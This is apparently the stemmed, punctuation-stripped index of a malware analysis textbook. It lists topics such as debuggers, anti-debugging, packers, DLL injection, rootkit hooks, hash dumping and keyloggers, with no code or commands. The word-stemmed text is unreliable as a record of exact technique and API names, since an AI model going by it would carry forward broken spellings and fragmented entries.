detail analysi class objectori code objectori program classtyp keyword snort intrus detect snort client side network server client side network clientiniti beacon attack use exist infrastructur clientserv framework compon object model servic closehandl function analyz exe closeservicehandl function analyz labsi windbg cloud servic opsec oper secur cloudburst tweak settingsclsid class identifi compon object model detail analysi com function detail analysi cmdex revers shell analysi cmp instruct stack layout thwart stackfram analysi detail analysi cocreateinst function compon object model understand surround code import window function detail analysi code main memori use name constant understand surround code int scan memori main memori perform checksum int scan redefin ida pro use name constant understand surround understand surround code code construct recogn c code construct assembl code crossrefer search code entri point unpack stub packer anatomi code librari link portabl execut file format coff common object file format ida pro support ida pro coiniti function understand surround code coinitializeex function servic color ida pro navig band use link crossrefer com compon object model servic clsid iid use com object understand surround code detail analysi decrypt ae relat function detail analysi server malwar clsid iid use com object command line plugin ollydbg plugin detail analysi ntglobalflag flaglaunch ntglobalflag flag command process malwar signatur web command command shell thread input detail analysi commandlin jump locat detail analysi analyz dll analyz exe detail analysi detail analysi analysi binari jump locat argument malwar analyz exe check argument analyz dll encod detail analysi option analysi detail analysi run malwar detail analysi comment enhanc disassembl detail analysi detail analysi detail analysi html detail analysi detail analysi detail analysi command charact pars detail analysi send command malwar detail analysi ida pro enhanc disassembl common object file format coff ida pro support ida pro comodo instant malwar analysi basic dynam analysi compar string process explor use verifi option compil level abstract compon object model com servic clsid iid use com object understand surround code detail analysi decrypt ae relat function detail analysi server malwar clsid iid use com objectscompress algorithm packer packer anatomi compsb instruct rep instruct comspec environment variabl detail analysi condit branch flowori disassembl thwart stackfram analysi web command short answer fals web command short answer flowori disassembl flowori disassembl condit breakpoint hardwar execut breakpoint breakpoint softwar breakpoint ollydbg breakpoint softwar breakpoint condit jump stack layout disassembl arithmet oper find loop check beingdebug flag condit x architectur stack layout configur inform window registri window registri connect function berkeley compat socket server client side network understand surround code import window function detail analysi connect mode netcat use apatedn connectnamedpip function import window function consol program imagesubsystemwindowscui valu examin pe file peview constructor creat destroy object content keyword snort intrus detect snort contentbas countermeasur network countermeasur get ip address domain inform control unit reverseengineeringcontrolservic function import window function short answer convent gener regist copyfil function analyz exe countermeasur malwarefocus network signatur get ip address domain inform contentbas get ip address domain inform networkbas malwarefocus network signatur covert launch techniqu covert malwar launch covert malwar launch launcher dll inject process replac detour detour lab summari apc inject detour detour detour hook inject process replac lab lab summari solut summari launcher covert malwar launch process inject launcher process replac dll inject cpu central process unit reverseengin creat new process x architectur reverseengin thread creat new process cpuid instruct virtual machin vulner instruct crash virtual machin procmon monitor process monitor createfil function file system function steppingov vs steppinginto configur window symbol look kernelmod code import window function detail analysi analyz exe detail analysi detail analysi debugg steppingov vs steppinginto createfilemap function file system function import window function detail analysi analyz exe detail analysi createmutex function interprocess coordin mutex import window function analyz dll createpip function netcat revers shell createprocess function basic dll structur netcat revers shell import window function detail analysi analyz dll revers shell analysi detail analysi detail analysi detail analysi detail analysi paramet detail analysi createremotethread function dll inject dll inject dll inject detour nop sled import window function summari short answer detail analysi detail analysi direct inject dll inject argument detail analysi dll inject dll inject createservic function servic svchost dll import window function detail analysi short answer detail analysi analyz labsi windbg createthread function creat thread createtoolhelpsnapshot function dll inject apc inject import window function detail analysi createwindowex function file system function credenti stealer rat gina intercept gina intercept hash dump analysi msginadl gina intercept gina intercept analysi msginadllhash dump gina intercept keystrok log hash dump crossrefer xref use window analysi search analyz function use graph option jump tabl ad miss code cross refer ida pro recogn vtabl detail analysi detail analysi use memori map locat dll detail analysi virtual function recogn vtabl check gethostbynam detail analysi global variabl use memori map locat dll graph analyz function use graph option detail analysi detail analysi function detail analysi instal export detail analysi ida pro use window analysi search ad miss code crossrefer ida pro ad miss code ad miss code crossrefer ida pro navig use window analysi cryptacquirecontext function import window function cryptograph algorithm identifi decod base common cryptograph algorithm recogn string import use krypto analyz recogn string import common cryptograph algorithm search cryptograph constant recogn string import search highentropi content use krypto analyz cryptographi drawback common cryptograph algorithm cwsandbox basic dynam analysisth c program languag kernighan ritchi recogn c code construct assemblyd da command windbg set kernel debug data section pe file pe file header section examin pe file peview use name constant view structur inform know sourc network content detail analysi hardcod vs ephemer know sourc network content overlay onto structur view structur inform python script convert string detail analysi redefin ida pro use name constant size examin pe file peview data buffer instruct manipul branch data crossrefer code crossrefer data encod data encod goal analyz encod algorithm goal analyz encod algorithm goal analyz encod algorithm xor identifi xor loop ida pro simpl encod scheme identifi decod base common cryptograph algorithm recogn string import use krypto analyz search high entropi content identifi custom encod identifi custom encod selfdecod use instrument gener decrypt lab hard code data vs ephemer data detail analysi cryptograph algorithm identifi decod base common cryptograph algorithm recogn string import use krypto analyz recogn string import common cryptograph algorithm search cryptograph constant recogn string import search highentropi content use krypto analyz custom search highentropi contentdecod identifi custom encod identifi custom encod self decod use instrument gener decrypt instrument gener decrypt use instrument gener decrypt manual program function selfdecod selfdecod identifi custom encod goal analyz algorithm goal analyz encod algorithm identifi leverag step hardcod data vs ephemer data lab lab detail analysi solut detail analysi simpl cipher goal analyz encod algorithm goal analyz encod algorithm xor identifi xor loop ida pro simpl encod scheme base simpl encod scheme caesar cipher goal analyz encod algorithm encod scheme identifi xor loop ida pro xor cipher xor data execut prevent dep detail analysi data section main memori main memori datadirectori array pe header vulner db command windbg examin hook function dd command windbg set kernel debug look kernel mode code analyz function major function tabl ddo distribut denialofservic attack rat detail analysi malwar launch detail analysi debugg debug debug debug kernel vs usermod debug kernel vs usermod debug singlestep steppingov vs step hardwar execut breakpoint except common except set breakpoint window debugg detect window debugg detect use window api check ntglobalflag int scan int scan int scan use queryperformancecount gettickcount use queryperformancecount gettickcount use tl callback use except insert int use callpop see also antidebug ollydbg windbg except hardwar execut breakpoint except firstand secondch except identifi behavior check ntglobalflag int scan int scan int scan int scan int scan perform code checksum int scan time check int scan interfer function use queryperformancecount gettickcount use queryperformancecount gettickcount use tl callback use except except use tl callback insert interrupt use except tl callback use queryperformancecount gettickcount justintim use callpop kernel vs user mode debug microsoft symbol set breakpoint modifi program execut common except sourcelevel vs assemblylevel debug use kernel vs usermod debug kernel vs usermod debug singlestep steppingov vs steppingintobreakpoint steppingov vs steppinginto singlestep kernel vs usermod debug steppingov vs steppinginto singlestep vulner insert int window debugg detect window debugg detect window debugg detect use window api manual check structur use window api window api window debugg detect decod identifi custom encod identifi custom encod self decod use instrument gener decrypt short answer filenam check detail analysi antidebug routin detail analysi instrument gener decrypt use instrument gener decrypt manual program function selfdecod selfdecod identifi custom encod stackform string short answer xorencod string filenam check decrypt use instrument gener decrypt detail analysi modifi base decod instrument gener use instrument gener decrypt ae modifi base decod requir detail analysi deep freez tool malwar analysi default view ida pro return use window analysi default web browser malwar determin short answersdef breakpoint set breakpoint analyz labsi windbg delet oper creat destroy object deletefil function pycommand prevent execut scriptabl debug delphi program compil time examin pe file peview dep data execut prevent detail analysi depend walker dependsex static runtim dynam link use verifi option tool malwar analysi detail analysi destructor creat destroy object detail filter procmon filter procmon detour detour devic driver driver kernel code look kernelmod code load driver tool malwar analysi view labsi ida pro view labsi ida pro analyz execut ida pro find driver memori windbg analysi analyz execut ida pro find kernel look kernelmod code find memori windbg find driver memori windbg ida pro open view labsi ida pro load load driver tool load tool malwar analysi windbg view view labsi ida pro devic object look userspac code look kernelmod code obtain handl look userspac code view kernel look kernelmod code deviceiocontrol function driver kernel code look userspac code look kernelmod code import window function detailedanalysi analyz function major function tabl devobj command windbg look kernelmod code digit logic level abstract digit signatur process explor display direct inject launcher disassembl basic dynam analysi level abstract see also antidisassembl ida pro interact disassembl profession disassembl window ollydbg ollydbg interfac disassembl crash cours x disassembl enhanc disassembl use fnstenv see also x disassembl enhanc ida pro enhanc disassembl hello world program use fnstenv distanc snort rule keyword take deeper look distribut denialofservic ddo attack rat detail analysi malwar launch detail analysi div instruct arithmet dividebyzero except detail analysi queryperformancecount function dll display window process explor process explor display dll inject trojan system binari identifi custom encod detail analysi detail analysi detail analysi dll loadord hijack trojan system binari dllcanunloadnow function clsid iid use com object import window function dllentrypoint function detail analysisdllgetclassobject function clsid iid use com object import window function dllinstal function clsid iid use com object import window function dllmain function run malwar dll launcher analyz without fulli unpack detail analysi detail analysi determin number function call detail analysi dllregisterserv function clsid iid use com object import window function dll find string see dynam link librari dll dllunregisterserv function clsid iid use com object import window function dllprocessattach detail analysi dn domain name system use malwar analysi machin hide plain sight hide plain sight tool malwar analysi attack tunnel inform hide plain sight attack use hide plain sight server malwar access use malwar analysi machin tool control respons tool malwar analysi dn request compar registri snapshot regshot basic dynam tool practic apatedn respons compar registri snapshot regshot check basic dynam tool practic document manual x architectur inform intel x architectur manual domain indic malici activ opsec oper secur get ip address domain informationand malici activ indic malici activ blacklist get ip address domain inform get inform opsec oper secur domain name system hide plain sight see dn domain name system domaintool get ip address domain inform doublepack malwar repair import tabl manual download basic dynam analysi malwar behavior short answer malwar short answer download malwar open url detail analysi detail analysi driver object driver kernel code look kernelmod code analyz labsi windbg find look kernelmod code get list analyz labsi windbg structur window driver kernel code driver signatur bit version window kernel issu window vista window x version driverentri function driver kernel code view labsi ida pro driverinit function view structur inform find driver memori windbg driverunload command find driver memori windbg drvobj command windbg look kernelmod code dt command windbg look kernelmod code analyz lab sy windbg find driver memori windbg analyz function major function tabl du command windbg set kernel debug dummi name enhanc disassembl global vs local variableschang global vs local variabl dummi servic inetsim use inetsim dump command ollydbg beingdebug flag dump execut memori manual unpack tool malwar analysi ollydump manual unpack dwo command windbg read memori dword handl repair import tabl manual call instruct target base repair import tabl manual window api handl dynam analysi goal malwar analysi basic dynam analysi basic dynam analysi basic dynam analysi basic dynam analysi use malwar sandbox sandbox drawback run malwar view process process explor analyz malici document compar registri snapshot regshot monitor netcat packet snif wireshark use inetsim lab crash cours x disassembl take deeper look tool malwar analysi detail analysi see also debugg advanc basic dynam analysi basic goal malwar analysi basic tool practic use inetsim benefit basic dynam analysi captur bat tool malwar analysi combin static analysi take deeper look compar registri snapshot regshot analyz malici document fake network compar registri snapshot regshotinetsim packet snif wireshark lab lab detail analysi solut detail analysi packet snif wireshark monitor netcat process explor view process view process process explor process monitor procmon run malwar run malwar sandbox drawback sandbox basic dynam analysi use malwar sandbox drawback use malwar sandbox dynam link librari dll find string explor dynam link function depend walker sandbox drawback sandbox drawback ida pro server client side network dll rebas memori breakpoint trojan system binari launcher dll inject detour analyz without fulli unpack detail analysi use memori map locat dll detail analysi analyz ida pro detail analysi base address differ prefer ida pro basic structur dll detour add new exist binari detour inject launcher dll inject debugg view dll inject launch sandbox drawback loadord hijack persist trojan system binari load ollydbg memori breakpoint malwar sandbox drawbacksmemori address rebas memori map locat use memori map locat dll pack analyz without fulli unpack process explor find inject detail analysi dynam link static runtim dynam link dynam unpack program autom autom unpack dynam link function explor depend walker static runtim dynam link devicephysicaldisk file access via namespac devicephysicalmemori window registry ea effect address idapython script use idc script eagl chri ida pro book ida pro eat export address tabl hook method cover tracksus mode rootkit eax regist arithmet detail analysi ebp regist stack ecb electron code book decrypt ae eckel bruce think c objectori program ecx regist paramet pointer edata section pe file pe file header section edi regist branch edx regist arithmet effect address ea idapython script use idc script eflag regist gener regist eip instruct pointer flag electron code book ecb decrypt ae elf execut link format ida pro support ida pro emt architectur bit malwar emailst malwar detail analysi emerg threat list signatur intrus detect snort enableexecuteprotectionsupport function import window function encod data encod see data encod encod function detail analysi detail analysi encrypt file identifi custom encod detail analysisfirst byte identifi custom encod write detail analysi encrypt write function graph identifi custom encod encrypt detail analysi short answer detail analysi decod algorithm ollydbg detail analysi indic short answer relationship function detail analysi endian x architectur instruct enter instruct stack entropi calcul pack execut identifi pack program entropi score depend chunk size search highentropi content enumprocess function import window function detail analysi enumprocessmodul function import window function epilogu stack differ x call convent stack usag bit code differ x call convent stack usag function stack eprocess structur analyz function major function tabl analyz function major function tabl chang analyz function major function tabl examin windbg analyz function major function tabl error messag string detail analysi detail analysi find binari detail analysi indic malwar like function detail analysi esi regist branch esp regist stack thwart stackfram analysisev captur toggl procmon x code path event flow window without hook inject process replac ex suffix window function explor dynam link function depend walker except handler trace poison ivi misus structur except handler differ x call convent stack usag prologu epilogu bit code detail analysi detail analysi build detail analysi bit system differ x call convent stack usag prologu epilogu bit code ollydbg trace poison ivi misus structur misus structur except handler properli disassembl code detail analysi exceptionhandl function misus structur except handler except clsid iid use com object hardwar execut breakpoint except misus structur except handler use tl callback debugg hardwar execut breakpoint except firstand secondch except window clsid iid use com object exceptionregistr data structur misus structur except handler exclus cipher xor see xor cipher exe file program infect detail analysi execut link format elf ida pro support ida pro execut find string detect packer peid static runtim dynam link examin pe file peview run malwar ida pro ollydbg packer anatomi shellcod analysi tool malwar analysi detail analysi detail analysi see also pack execut dump memori tool malwar analysi function import ordin static runtim dynam link run malwar load ida pro packer anatomi detail analysi ida pro ida pro address space anoth process detail analysi open ollydbg ollydbg peid plugin run detect packer peid search string find string shellcod shellcod analysi termin detail analysi exit analysi immedi detail analysi expedi vs accuraci intrus detect snort exploit dll loadord hijack explorerex detail analysi x code path code search x code path write path process detail analysi export address tabl eat hook method cover tracksus mode rootkit export data imageexportdirectori array pars pe export data export function import function detail analysi absenc detail analysi export window ida pro use window analysisexternalnet variabl snort intrus detect snortf fake servic packet snif wireshark fakedn tool malwar analysi fake network compar registri snapshot regshot use apatedn netcat nc monitor use apatedn fals posit snort take deeper look fast librari identif recognit technolog flirt ida pro decod stackform string signatur detect decod stackform string fastcal call convent push vs move fiber microsoft system creat thread file contain much data error ollydbg pe header vulner file map file system function file signatur antiviru scan use first step file system filter procmon filter procmon file system function window api file system function fileinform structur examin hook function fileinsight tool malwar analysi filemon tool run malwar file take snapshot configur window symbol bruteforc xor encod analyz exe decod stackform string examin hook function hide file short answer short answer detail analysi bruteforc mani bruteforc xor encod check name decod stackform string hidden examin hook function hide filesrecov hide file malwar creation short answer malwar modif analyz exe malwar open short answer malwar upload detail analysi transfer virtual machin take snapshot write kernel space configur window symbol filebothdirinform structur examin hook function filter dialog process monitor detail analysi filter monitor process monitor monitor netcat procmon monitor process monitor wireshark monitor netcat find oep plugin section hop rebuild import tabl import reconstructor findcrypt use krypto analyz detail analysi output detail analysi findfirstfil function potentialkeyloggerex unpack execut import window function short answer detail analysi analyz exe detail analysi find find string understand surround code rebuild import tabl import reconstructor rebuild import tabl import reconstructor use autom tool find oep network code understand surround code origin entri point oep rebuild import tabl import reconstructor rebuild import tabl import reconstructor use autom tool find oepmanu use autom tool find oep autom tool rebuild import tabl import reconstructor string find string findkernelbas function full hello world exampl detail analysi detail analysi findnextfil function potentialkeyloggerex unpack execut short answer detail analysi detail analysi findresourc function launcher import window function detail analysi short answer detail analysi findsymbolbyhash function use hash export name full hello world exampl detail analysi detail analysi findwindow function check ntglobalflag import window function detail analysi search debugg check ntglobalflag firewal set hostonli network kernel issu window vista window x version kernel patch kernel issu window vista window x version virtual machin set hostonli network firmwar level abstract flag gener regist fldz instruct use fnstenv flexhex tool malwar analysi flink pointer find kerneldl memori flirt fast librari identif recognit technolog ida pro decod stackform stringssignatur detect decod stackform string floatingpoint instruct analyz link list travers flow chart current function analyz function flow control obscur imposs disassembl imposs disassembl ad miss code crossrefer ida pro ad miss code cross refer ida pro misus structur except handler ad miss code crossrefer ida pro ad miss code cross refer ida pro function pointer problem imposs disassembl misus structur except handler misus structur except handler return pointer abus ad miss code crossrefer ida pro flow snort rule keyword take deeper look flowori disassembl understand antidisassembl linear disassembl fnstenv instruct structur use callpop loop find loop forceflag field heap header check processheap flag format string identifi detail analysi format operand ida pro enhanc disassembl fpu x floatingpoint unit use callpop fpusavest structur use callpop frame function differ x call convent stack usag fs segment regist seh chain misus structur except handler check beingdebug flag fsginadl gina intercept fstenv instruct structur use callpopftpputfil function import window function short answer ftpsetcurrentdirectori function short answer function pointer imposs disassembl use vtabl problem imposs disassembl function portabl execut file format static runtim dynam link explor dynam link function depend walker import function import function potentialkeyloggerex unpack execut potentialkeyloggerex unpack execut run malwar data cross refer analyz function recogn statement cdecl softwar execut breakpoint rootkit analysi practic thwart stackfram analysi find oep manual use callpop pointer inherit function overrid virtual vs nonvirtu function detail analysi analyz exe analyz exe detail analysi detail analysi lab solut analysi determin stack frame construct thwart stackfram analysi analyz ida pro data crossrefer recogn statement graphic recogn statement call convent cdecl decis skip analysi analyz exe disassembl memori dump softwar execut breakpoint execut import ordin static runtim dynam link run malwar execut use portabl execut file format export import function find connect detail analysi find instal hook rootkit analysi practic graph crossrefer detail analysisgraph call analyz function hardcod locat call use callpop identifi store memori locat lab solut import import function potentialkeyloggerex unpack execut name convent explor dynam link function depend walker overload objectori program pointer program termin detail analysi recurs analyz exe search inform potentialkeyloggerex unpack execut steppingov vs steppinginto find oep manual virtual vs nonvirtu inherit function overrid virtual vs nonvirtu function vtabl virtual vs nonvirtu function function window ida pro use window analysisg g go command windbg read memori gcc gnu compil convent call convent style gdidll explor dynam link function depend walker potentialkeyloggerex unpack execut import potentialkeyloggerex unpack execut gdt global descriptor tabl vulner instruct gdt regist gdtr vulner instruct gener regist regist differ x architectur x architectur differ x architectur get request indic malici activ hide plain sight network analysi malici activ indic malici activ malwar construct network analysi getadaptersinfo function import window function find antivm techniqu use string dynam resolut find antivm techniqu use string getaddrinfo function understand surround code getasynckeyst function userspac keylogg import window function summari detail analysi getcommandlinea function find oep manual winupack breakpoint winupack getcont function detail analysi getcurrentprocessid function use memori map locat dll getcurrentthreadid function detail analysisgetdc function import window function getfiles function detail analysi getforegroundwindow function userspac keylogg import window function summari detail analysi detail analysi gethash function gina intercept gethostbynam function understand surround code know sourc network content import window function detail analysi detail analysi gethostnam function import window function detail analysi detail analysi getkeyst function userspac keylogg import window function getmodulebasenamea function detail analysi getmodulefilenam function import window function detail analysi detail analysi decod stackform string detail analysi getmodulehandl function find oep manual winupack import window function detail analysi breakpoint winupack getprocaddress function find string portabl execut file format rootkit analysi practic hash dump dll inject load execut identifi pack program find oep manual use fnstenv import window function detail analysi set breakpoint find oep manual unpack stub import load execut getstartupinfo function import window function getsystemdefaultlangid function import window function detail analysi getsystemdefaultlcid function modifi program execut practicegettemppath function import window function detail analysi getthreadcontext function import window function detail analysi detail analysi gettickcount function understand surround code know sourc network content hardcod data vs ephemer data time check import window function queryperformancecount function getvers function find oep manual getversionex function import window function getwindowsdirectori function import window function gfi sandbox basic dynam analysi gina graphic identif authent intercept gina intercept short answer indic short answer global descriptor tabl gdt vulner instruct global valu memori main memori global variabl recogn c code construct assembl use memori map locat dll detail analysi crossrefer use memori map locat dll vs local recogn c code construct assembl globalalloc function detail analysi global uniqu identifi guid compon object model gnu compil collect gcc call convent style gnuunx gnu c unix librari use name constant grabhash function hash dump graph search highentropi content identifi custom encod ida pro entropi plugin search highentropi contentof encrypt write identifi custom encod graph mode ida pro load execut analyz function graphic identif authent gina intercept gina intercept short answer indic short answer gray hat python seitz scriptabl debug gui manipul function potentialkeyloggerex unpack execut gui program imagesubsystemwindowsgui valu examin pe file peview guid global uniqu identifi compon object modelh haldll malici driver driver kernel code handl file system function look userspac code look kernelmod code hash dump dll inject detail analysi detail analysi detail analysi devic object look userspac code look kernel mode code obtain look userspac code inject malici dll dll inject servic openservic function detail analysi window api file system function locat pdf document detail analysi obtain samsrvdll advapidl hash dump winlogon open detail analysi handl type h type window api handl handl window process explor process explor display hardcod header network signatur hardcod locat function call use callpop hardwar breakpoint breakpoint condit breakpoint int scan lab solut ollydbg breakpoint condit breakpoint vs softwar lab solut hardwar level x architectur level abstract hash dump gina intercept hash dump identifi method hash dumpinghash function use hash export name hash export name symbol resolut pars pe export data hash antiviru scan use first step header potentialkeyloggerex unpack execut network signatur hardcod network signatur pe file format potentialkeyloggerex unpack execut head function use idc script heap main memori heap space creat creat destroy object heap spray detail analysi heap structur inform creat check processheap flag hello world program use fnstenv use hash export name disassembl use fnstenv help ollydbg analyz shellcod heurist antiviru scan use first step hex editor neo tool malwar analysi hex editor tool malwar analysi hex window wireshark monitor netcat hex workshop tool malwar analysi hexray decompil plugin use commerci plugin thwart stackfram analysi tool malwar analysi hexedit tool malwar analysi hidden file examin hook function hide file recov hide file hidden process analyz function major function tablehid debugg plugin plugin check beingdebug flag ollydbg plugin hidedebug plugin check beingdebug flag highentropi content search use krypto analyz highlevel languag level abstract level abstract highlevel remot hook local remot hook hkey window registri hkeyclassesroot common registri function short answer httpshellopencommand short answer hkeycurrentconfig common registri function hkeycurrentus hkcu common registri function hkeylocalmachin hklm common registri function hkeylocalmachinesoftwar registri key window bit window bit detail analysi detail analysi detail analysi short answer microsoftcryptographyrngse detail analysi short answer regsetvalu detail analysi microsoftwindow ntcurrentversionsvchost detail analysi microsoftwindowscurrentversionrun detail analysi hkeyus common registri function hlpgetprimarycredenti function hash dump homenet variabl snort intrus detect snort honeypot antivirtu machin techniqu hook function ntquerydirectoryfil function find rootkit hook inject process replac thread target assembl code thread targetinghook find driver object rootkit rootkit analysi practic user space keylogg cover tracksusermod rootkit local remot hook detail analysi detail analysi detail analysi detail analysi examin ollydbg detail analysi function detail analysi inlin cover tracksusermod rootkit keylogg userspac keylogg local remot local remot hook look code rootkit analysi practic lowlevel oper detail analysi malwar instal code detail analysi system servic descriptor tabl ssdt find driver object rootkit check rootkit hostbas signatur goal malwar analysi hostonli network configur vmware hostnam detail analysi detail analysi detail analysi base string encod detail analysi function obtain detail analysi local machin load buffer detail analysi hotkey regist potentialkeyloggerex unpack execut html hypertext markup languag comment detail analysi detail analysi detail analysi command charact pars detail analysi send command malwar detail analysi hton function detail analysishttpport variabl snort intrus detect snort http hypertext transfer protocol download launcher hide plain sight network analysi attack use hide plain sight port download launcher revers backdoor network analysi http server use malwar analysi machin use inetsim detail analysi backdoor indic detail analysi malwar access use malwar analysi machin simul use inetsim httpopenrequest function understand surround code httpqueryinfo function understand surround code http server simul use inetsim http attack use hide plain sight httpsendrequest function understand surround code hungarian notat handl hyde randal art assembl languag reverseengin hypertext markup languag html comment detail analysi detail analysi detail analysi command charact pars detail analysi send command malwar detail analysi hypertext transfer protocol http download launcher hide plain sight network analysi attack use hide plain sight port download launchersrevers backdoor network analysisi io commun port queri use red pill antivm techniqu iat import address tabl hook method cover tracksus mode rootkit ice incircuit emul breakpoint insert int ida pro interact disassembl profession ida pro ida pro load execut load execut use window analysi use window analysi use window analysi use window analysi use link crossrefer use link crossrefer use link crossrefer jump locat search data cross refer analyz function enhanc disassembl use name constant extend ida plugin use idc script use commerci plugin lab recogn statement find loop configur window symbol nullpreserv singlebyt xor encod recogn string import use krypto analyz analyz pars routin flowori disassembl jump instruct target use tl callback queri io commun port identifi pack program use autom tool find oep use autom tool find oep tool malwar analysi tool malwar analysi short answer detail analysi use memori map locat dll view lab sy ida pro analyz labsi windbg detail analysi short answer find antivm techniqu use string ad ipadapterinfo structur find antivm techniqu use string analyz function data crossrefer analyz function graphic recogn statement appli structur use memori map locat dll comparison plugin tool malwar analysi consecut jump instruct jump instruct targetcrossrefer search enhanc disassembl enhanc disassembl findcrypt use krypto analyz tl callback function analysi use tl callback graph option analyz function find loop analyz pars routin use autom tool find oep loop find loop pars routin analyz pars routin view tail jump use autom tool find oep highlight antivm queri io commun port identifi xor loop nullpreserv singlebyt xor encod interfac load execut load execut use window analysi use window analysi disassembl window mode load execut return default view use window analysi window analysi use window analysi lab lab short answer solut short answer list import cryptograph function recogn string import load execut ida pro look userspac code configur window symbol manual switch byte data instruct flowori disassembl navig use window analysi use window analysi use link crossrefer use link crossrefer use link crossreferencescolor navig band use link crossrefer explor histori use link crossrefer jump locat use link crossrefer link crossrefer use window analysi pack program identifi pack program plugin extend use name constant extend ida plugin use idc script use commerci plugin commerci plugin use commerci plugin idapython use idc script idc script extend ida plugin search x instruct vulner vm detect short answer search jump locat search pack execut tail jump use autom tool find oep open driver view labsi ida pro toggl graph tradit view detail analysi vs windbg analyz labsi windbg winmain function detail analysi ida pro databas idb ida pro ida pro entropi plugin use krypto analyz search highentropi content detail analysi detail analysi graph search highentropi content ida pro free ida pro idaapi modul idapython use idc script idapython use idc scriptsidata section pe file pe file header section idautil modul idapython use idc script idb ida pro databas ida pro idc modul idapython use idc script idc script extend ida plugin idea intern data encrypt algorithm use krypto analyz identifi malwar hash antiviru scan use first step idss intrus detect system network countermeasur get ip address domain inform intrus detect snort signaturebas get ip address domain inform snort intrus detect snort idt interrupt descriptor tabl rootkit analysi practic vulner instruct idt regist idtr vulner instruct statement disassembl arithmet oper switch option activ internet connect switch option recogn disassembl arithmet oper iid interfac identifi compon object model detail analysi com function detail analysi imag base rebas imagedatadirectori structur pe header vulner imagedoshead structur pe file header section detail analysi imageexportdirectori array export data pars pe export data imagefiledl modifi pe header run malwareimagefilehead pe file pe file header section imagenthead structur pe file header section detail analysi imageoptionalhead structur insert int imageoptionalhead pe file examin pe file peview imagesectionhead structur examin pe file peview detail analysi imagesubsystemwindowscui valu consol program examin pe file peview imagesubsystemwindowsgui valu gui program examin pe file peview iment command windbg search symbol immgetreg function use instrument gener decrypt immremotevirtualalloc command use instrument gener decrypt immsetbreakpoint function use instrument gener decrypt immwritelong function use instrument gener decrypt immwritememori command use instrument gener decrypt immdbg immun debugg ollydbg bookmark use instrument gener decrypt tool malwar analysi detail analysi python script bookmark immedi operand main memori immun debugg immdbg ollydbg bookmark use instrument gener decrypt tool malwar analysi detail analysi python script bookmark immun secur compani ollydbg import address tabl iat hook method cover tracksusermod rootkit import reconstructor imprec manual unpack tool malwar analysi import tabl detour manual unpack find oep manual detail analysi absenc detail analysi modif detour rebuild import reconstructor manual unpack repair manual find oep manual import function portabl execut file format import function potentialkeyloggerex unpack execut load execut detail analysi examin list detail analysi packer resolv load execut import window ida pro use window analysi imprec import reconstructor manual unpack tool malwar analysi instruct x queri io commun port incircuit emul ice breakpoint insert int index servic malwar start detail analysi indirect tactic opsec oper secur inetsim packet snif wireshark basic dynam tool practic basic dynam tool practic tool malwar analysi detail analysi log request basic dynam tool practic inetaddr function import window function analyz dll informationst malwar type malwar infrastructur attack use exist attack use exist infrastructur inherit objectori program inherit function overridingini file window registri ininitializationorderlink list structur find kerneldl memori initi function view structur inform inject code bit version bit malwar inlin hook cover tracksusermod rootkit detail analysi function instal detail analysi input function decod identifi custom encod inputoutput system io x architectur reverseengin insert interrupt use except instal export graph crossrefer detail analysi instal structur virtual machin detail analysi inlin hook detail analysi vmware tool structur virtual machin installservic run malwar instanc class objectori program instruct pointer reverseengin regist common except debugg chang common except instruct pointerrel data address x architectur differ x architectur instruct set level abstract instruct main memori imposs disassembl queri io commun port byte part multipl imposs disassembl x architectur main memori queri io commun port antivm queri io commun portint xe instruct except thing go wrong int antidebug techniqu insert int int instruct except use except except except insert use except int scan int scan interact disassembl profession ida pro see ida pro interact disassembl profession interfac identifi iid compon object model detail analysi com function detail analysi intern data encrypt algorithm idea use krypto analyz internet connect malwar analysi virtual machin use malwar analysi machin detail analysi switch option construct activ switch option malwar malwar analysi virtual machin use malwar analysi machin malwar check activ detail analysi internet explor thirdparti plugin clsid iid use com object internet function graph function connect detail analysi internet relay chat irc hide plain sight internet servic simul packet snif wireshark internetclosehandl function detail analysi detail analysi internetconnect function understand surround code internetgetconnectedst function detail analysi detail analysi internetopen function server client side network understandingsurround code import window function detail analysi detail analysi detail analysi detail analysi short answer detail analysi internetopenurl function server client side network understand surround code import window function detail analysi detail analysi detail analysi detail analysi internetreadfil function server client side network understand surround code import window function detail analysi detail analysi detail analysi internetwritefil function understand surround code import window function interpret languag level abstract interprocess coordin mutex creat thread interrupt descriptor tabl idt rootkit analysi practic vulner instruct interrupt rootkit analysi practic use except antidebug use except rootkit rootkit analysi practic intrus detect system idss network countermeasur get ip address domain inform intrus detect snort signaturebas get ip address domain inform snort intrus detect snort intrus prevent system ipss network countermeasur ioconnectinterrupt function rootkit analysi practic iocreatedevic function analyz execut ida pro iocreatesymboliclink function analyz execut ida pro iogetcurrentprocess function recov hidden file analyz function major function tableimport recov hidden file iopinvaliddevicerequest function analyz function major function tabl ip address indic malici activ opsec oper secur get ip address domain inform malici activ indic malici activ blacklist get ip address domain inform get opsec oper secur iprip servic malwar instal detail analysi ipadapterinfo structur ad ida pro find antivm techniqu use string irc internet relay chat hide plain sight irpmjdevicecontrol function look kernelmod code look kernelmod code look kernelmod code code list look kernelmod code locat function look kernelmod code irpmjread function look kernelmod code irvin cynthia bypass vmware artifact search isdataat snort rule keyword take deeper look isdebuggerpres function window debugg detect import window function isntadmin function import window function iswowprocess function window bit window bit import window function detail analysi effort dynam resolv detail analysi itanium bit malwareiwebbrows interfac navig function compon object model ida pro book eagl ida proj javascript nop sled short answer pdf file short answer profil user system nop sled jmp instruct stack layout understand antidisassembl flowori disassembl jump instruct target jump instruct constant condit detail analysi consecut ida pro jump instruct target constant condit jump instruct constant condit target flowori disassembl jnz instruct shellcod analysi joe sandbox basic dynam analysi jump instruct tail jump jump tabl switch structur detail analysi jump locat ida pro use link crossrefer justintim debugg use callpop short answer ollydbg short answer jz instruct detail analysi short answer detail analysi fals condit short answer target detail analysisk kanal krypto analyz use krypto analyz detail analysi detail analysi keinitializeapc function apc inject user space keinsertqueueapc function apc inject user space kernel code driver kernel code bit malwar appli structur ida pro analyz labsi windbg bit malwar bit malwar breakpoint appli structur ida pro malwar creation file analyz labsi windbg kernel debug kernel debug windbg driver kernel code configur window symbol look userspac code configur window symbol set vmware driver kernel code windbg kernel debug windbg kernel driver creat servic load look userspac code kernel mode except thing go wrong debug bypass vmware artifact search binari translat vmware bypass vmware artifact search debugg vs user mode debug window except thing go wrong kernel patch protect kernel issu window vista window x version kernel space apc inject apc inject user space kernelbas keylogg hash dump kernelmod apc apc injectionkernelmod code look look kernelmod code kerneldl static runtim dynam link explor dynam link function depend walker potentialkeyloggerex unpack execut kernel vs user mode use fnstenv use fnstenv find kerneldl memori short answer detail analysi short answer detail analysi analyz exe assembl code 